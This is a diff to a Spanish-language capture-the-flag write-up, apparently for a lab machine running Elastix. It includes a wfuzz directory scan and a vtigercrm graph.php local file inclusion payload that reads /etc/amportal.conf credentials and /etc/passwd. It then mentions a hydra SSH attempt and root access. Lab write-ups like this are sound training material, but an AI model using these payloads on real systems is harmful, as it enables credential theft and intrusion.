@@ -23,7 +23,7 @@ Revisamos la pagina web vemos que es un elastix (https://es.wikipedia.org/wiki/E
 
 realizamos un scaneo de directorios en busca de algo mas de información
 
-    wfuzz -c -t 400 --hc=404 --hh=1785 -L -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ
+    wfuzz -c -t 400 --hc=404 --hh=1785 -L -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ/
             
 ![Image text]()
 
@@ -33,11 +33,21 @@ Buscamos informacion sobre Elastix y encontramos una vulnerabilidad LFI
 
     /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
     
-Lo ejecutamos y vemos que nos muestra varias credenciales.
+Lo ejecutamos y vemos que nos muestra unas credenciales.
 
 probamos a ver /etc/passwd para ver los usuarios que tienen bash e intentar conectar con ellos
 
      /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
+
+Sacamos el listado de usuarios y lanzamos hydra para ver si nos conecta por ssh con las credenciales obtenidas.
+
+
+
+Accemos con root por ssh
+
+conseguimos la flag de user.txt
+
+conseguimos la flag de root.txt
 
 
 
